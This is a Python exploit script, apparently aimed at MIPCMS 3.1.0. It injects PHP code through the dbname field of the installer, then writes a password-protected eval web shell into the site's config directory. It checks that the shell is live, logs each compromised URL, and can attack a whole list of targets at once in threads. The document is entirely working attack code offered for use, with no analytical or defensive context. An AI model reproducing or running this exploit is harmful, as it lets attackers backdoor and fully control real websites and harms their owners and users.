#!/usr/bin/env
#author:F0rmat
import sys
import requests
import threading
def exploit(target):
    dbhost='192.168.1.102'
    dbuser = 'root'
    dbpw = 'root'
    dbport=3306
    dbname="test',1=>eval(file_get_contents('php://input')),'2'=>'"
    if sys.argv[1]== "-f":
        target=target[0]
    url1=target+"/index.php?s=/install/Install/installPost"
    data={
        "username": "admin",
        "password":  "admin",
        "rpassword": "admin",
        "dbport": dbport,
        "dbname": dbname,
        "dbhost": dbhost,
        "dbuser": dbuser,
        "dbpw": dbpw,
    }
    payload = "fwrite(fopen('shell.php','w'),'<?php @eval($_POST[f0rmat])?>f0rmat');"
    url2=target+"/system/config/database.php"
    shell = target+'/system/config/shell.php'
    try:
        requests.post(url1,data=data).content
        requests.post(url2, data=payload)
        verify = requests.get(shell, timeout=3)
        if "f0rmat" in verify.content:
            print 'Write success,shell url:',shell,'pass:f0rmat'
            with open("success.txt","a+") as f:
                f.write(shell+'  pass:f0rmat'+"\n")
        else:
            print target,'Write failure!'
    except Exception, e:
        print e
def main():
    if len(sys.argv)<3:
        print 'python mipcms_3.1.0.py -h target/-f target-file '
    else:
        if sys.argv[1] == "-h":
            exploit(sys.argv[2])
        elif sys.argv[1] == "-f":
            with open(sys.argv[2], "r") as f:
                b = f.readlines()
                for i in xrange(len(b)):
                    if not b[i] == "\n":
                        threading.Thread(target=exploit, args=(b[i].split(),)).start()



if __name__ == '__main__':
    main()
